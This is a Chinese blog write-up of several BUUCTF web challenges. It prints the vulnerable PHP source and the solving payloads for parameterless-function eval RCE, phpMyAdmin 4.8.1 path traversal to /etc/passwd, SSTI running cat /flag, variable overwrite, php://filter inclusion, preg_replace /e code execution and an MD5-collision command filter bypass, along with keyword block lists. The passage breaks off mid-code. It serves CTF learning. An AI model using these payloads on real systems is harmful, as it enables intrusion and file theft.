class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码审计一下，过滤了伪协议，我最爱的php://filter也被过滤了。</p><p>本题难点就在绕过第三个条件。</p><p>又是知识盲区，看一下wp。</p><p><em><strong>什么是无参数函数RCE</strong></em>：</p><p>RCE:<strong>远程命令执行ping和远程代码执行evel。</strong></p><p>源码中有<code>@eval($_GET[&#39;exp&#39;]);</code>，可以注入一句话木马，但是有正则替换限制，</p><p><code>if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;]))</code></p><p>(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。</p><p>如果使用参数就无法通过正则验证，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">只允许执行如下命令：</span><br><span class="line">system()</span><br><span class="line">不允许：</span><br><span class="line">system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE</a></p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">https://www.cnblogs.com/wangtanzhi/p/12260986.html</a></p><p>首先要得到当前目录下的文件，**scandir()**可以实现，</p><p>这里我们要好好找一下php相关无参数函数，</p><p><strong>print_r()</strong> 函数用于打印变量，以更容易理解的形式展示。如果给出的是<em>数组</em>，将会按照一定格式显示键和元素。object 与数组类似。</p><p><strong>localeconv() 函数</strong>   函数返回一包含本地数字及货币格式信息的<em>数组</em>。</p><p>构造出payload：</p><p><code>?exp=print_r(scandir(current(localeconv())));</code></p><p>或者</p><p><code>?exp=print_r(scandir(pos(localeconv())));</code> pos是current别名。</p><p>还有 ：<strong>current(localeconv())永远都是个点</strong></p><p><img src="buu2/5.png"></p><p>怎么读取倒二个数组？查看一下current()函数语法：</p><p><img src="buu2/6.png"></p><p><em>不能直接得到倒数第二个，别想着连用两次这个函数，连用两次，第一次返回的结果是值，不是数组，会报错。</em></p><p><strong>方法一：相反顺序返回数组。</strong></p><p>函数<strong>array_reverse()</strong></p><p>构造payload：</p><p><code>?exp=print_r(next(array_reverse(scandir(pos(localeconv())))));</code></p><p><img src="buu2/7.png"></p><p>可算返回flag.php了。</p><p>然后通过函数readfile()读取或者hightlight_file()函数或者show_source()。</p><p>得到flag，f12查看。</p><p><strong>方法二：随机交换数组的键和值，直到返回flag.php。</strong></p><p>函数array_flip()交换数组的键和值，通过array_rand() 函数返回数组中的一个随机键名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_rand(array,number)</span><br></pre></td></tr></table></figure><p>构造payload：</p><p><code>?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));</code></p><p>这两个函数缺一不可。如果没有交换键和值，只能得到键名，无法读取值的内容。</p><p>方法三：通过**session_id(session_start())**得到flag信息。</p><p>PHPSESSID本身就支持flag.php字符。</p><p>session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。</p><p>session_id()可以获取到当前的session id。</p><p>因此我们手动设置名为PHPSESSID的cookie，并设置值为flag.php。</p><p><img src="buu2/8.png"></p><p>cookie值记得只能是flag.php，要把多余的红字部分删除。</p><h3 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h3><p>什么都没发现，肯定有什么备份文件或者是别的目录，试了一下robots.txt，得到一个文件，phpinfo.php，访问一下得到该php相关信息，好像用处不大，也用不了一句话木马，目录还有一个phpmyadmin，这个跟题目相关了，访问一下。</p><p>看了一下phpmyadmin版本4.8.1，百度一下存在远程文件读取漏洞，</p><p>可以参考一下：<a href="https://www.cnblogs.com/leixiao-/p/10265150.html">https://www.cnblogs.com/leixiao-/p/10265150.html</a></p><p>构造payload：</p><p><code>index.php?target=db_sql.php%253f/../../../../../etc/passwd</code></p><p><img src="buu2/9.png"></p><p><code>index.php?target=db_sql.php%253f/../../../../../flag</code></p><p>读取flag。</p><p><img src="buu2/10.png"></p><p><em>这里%253f什么意思呢，其实就是传入的参数会被url解密两次，最后得到拼接符?</em></p><h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p>抓包伪造一下xff字段，回显改成我们伪造的ip值，看一下别的页面，hint.php有你知道为什么我知道你的ip吗？</p><p>这里的xff字段应该存在什么漏洞。原来存在ssti注入。</p><p>构造payload：</p><p><code>&#123;&#123;system('cat /flag')&#125;&#125;</code></p><p><img src="buu2/11.png"></p><p>这题突破口在于发现存在ssti注入。要根据题目来找注入点。</p><h3 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h3><p><em><strong>原理：$$导致的变量覆盖漏洞。</strong></em></p><p>扫描目录，由于访问太频繁会被限制，要多加些参数。</p><p><code>python dirsearch.py -u http://d5007599-5248-4224-ac1d-c82113740615.node3.buuoj.cn/ --timeout=2 -t 1 -s 0.01</code></p><p>-t 表示线程，-s表示每次请求间隔的时间，–timeout表示连接超时时间。</p><p>关于dirsearch相关用法可以看看：<a href="https://blog.csdn.net/qq_43936524/article/details/115271837">https://blog.csdn.net/qq_43936524/article/details/115271837</a></p><p>扫了过后，我们可以发现.git源码泄露，使用githack得到源码。</p><p>很奇怪没找到源码，先网上找找源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;<span class="comment">//GET方式传入flag参数必须完全等于x且x不等于flag。</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;<span class="comment">//GET和POST都不存在flag参数</span></span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;<span class="comment">//GET或POST传的是flag参数。</span></span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>函数foreach</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreach (iterable_expression as $value)</span><br><span class="line">    statement</span><br><span class="line">foreach (iterable_expression as $key =&gt; $value)</span><br><span class="line">    statement</span><br></pre></td></tr></table></figure><p>第一种格式遍历给定的 <code>iterable_expression</code> 迭代器。每次循环中，当前单元的值被赋给 <code>$value</code></p><p>第二种格式做同样的事，多了一步，当前单元的键名也会在每次循环中被赋给变量 <code>$key</code></p><p>函数exit</p><p>exit() 函数输出一条消息，并退出当前脚本。</p><p>存在三个条件，三个输出，最后还有一个输出$flag，但是要同时绕过三个条件，存在逻辑错误。</p><p>同时注意到exit也可以作为输出，第一个条件明显不可能，看看第二条，我们要利用变量覆盖漏洞，需要用get提交，</p><p>在代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em><strong>当我们传入通过get传入yds=flag，$y就变成了flag，$x=yds,最后就变成了$yds=$flag。通过exit输出flag值。</strong></em></p><p>构造payload：<code>?yds=flag</code></p><p><img src="buu2/12.png"></p><p>第三个也可以输出结果，构造payload：</p><p><code>?is=flag&amp;flag=flag</code></p><p>第一get传参的结果和上面的一样是$is=$flag，为了满足第三个条件句的输出，加上后面这个get传参，经过foreach循环的结果是$flag=$flag，成功输出flag。</p><p><img src="buu2/13.png"></p><h3 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过data协议读入base64加密的I have a dream，然后再用php://filter读取next.php文件内容。payload：</p><p><code>?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code></p><p>通过base64解码，得到源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>preg_replace(p,r,s)函数,p:要搜索的模式，r用于替换的字符串或字符数组，s目标字符串或目标数组当p传入的正则表达式带有/e时，存在命令执行，即当匹配到符合正则表达式的字符串时，第二个参数的字符串可被当做代码来执行。<br>这里第二个参数固定为<code>strtolower(&quot;\\1&quot;)</code><br>这里的<code>\\1</code>实际上体现为<code>\1</code>,转义。</p><p>有关preg_replace与代码执行可以看看：</p><p><a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p><ul><li><p>反向引用</p><p>对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问</p></li></ul><p>\1指的是第一个匹配项，官方相关payload：</p><p><code>/?.*=&#123;$&#123;phpinfo()&#125;&#125;</code></p><p><em><strong>思路是利用这个代码执行，执行源码中的getFlag()函数，在传入cmd参数，再利用getFlag中的eval（）函数，再进行一个代码执行。</strong></em></p><p>构造payload：</p><p><code>next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></p><p>由于传入.会被替换成_. 所以使用\S 表示匹配所有非空字符。</p><p>这样就可以通过preg_replace漏洞执行getFlag()函数，然后传入cmd相关命令，得到flag。</p><p><img src="buu2/14.png"></p><p><strong>本题关键：正则替换代码执行。</strong></p><h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p>发现url挺有特点，思路通过img传参来得到源码。</p><p><img src="buu2/15.png"></p><p>这里有一个逆向解码的过程，</p><p>先对img后面的参数两次base64解码，得到3535352e706e67，发现是十六进制数，我们再通过函数hex2bin()把它转换成ASCII 字符，得到555.png。</p><p><img src="buu2/16.png"></p><p>这里我们先把index.php转化成十六进制，再进行两次base64编码。</p><p>通过函数bin2hex()实现：</p><p><img src="buu2/17.png"></p><p>再进行两次base64加密，得到：TmprMlpUWTBOalUzT0RKbE56QTJPRGN3，成功读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) </span><br><span class="line">    header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class="line">    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这里对传入cmd的值进行了很多关键词过滤，</p><p>php变量前面加的(string) 是强制转换标志,他的意思是不管后面的变量是什么类型, 都以string 字符串类型解析 ;导致这里不能像以前一样通过数组绕过了。</p><p>学习一下新的<em>md5</em>相关的绕过方法：</p><p>有关md5的一些绕过可以看看：</p><p><a href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">https://blog.csdn.net/CSDNiamcoming/article/details/108837347</a></p><p><strong>强类型绕过：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p><em><strong>post传参，如果使用hackbar传参会被编码，所以直接使用burp，但是记得通过hackbar进行post提交再抓包，不然直接get提交再抓包修改GET为POST为缺少一些相关字段信息，不能成功post提交我们要提交的参数。</strong></em></p><p><img src="buu2/18.png"></p><p>当前目录没flag，我们到根目录找flag。</p><p><img src="buu2/19.png"></p><p>cat被过滤了，但是构造ca\t，\t会变成TAB而绕过，然后获得bin下的flag，payload：</p><p><code>/bin/c\at%20/flag</code></p><p><img src="buu2/20.png"></p><p>或者可以构造c\at，l\s这样的带个转义字符的命令在Linux上也可以执行。</p><p><code>/bin/c\at%20flag</code></p><p><img src="buu2/21.png"></p><h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><p>页面时不时跳动一下，应该是有post提交什么参数，抓包看一下，尝试了一下，发现左边可以提交相关函数，右边则是函数内容。</p><p>试了一下函数readfile，成功了，拿到源码</p><p><img src="buu2/22.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span 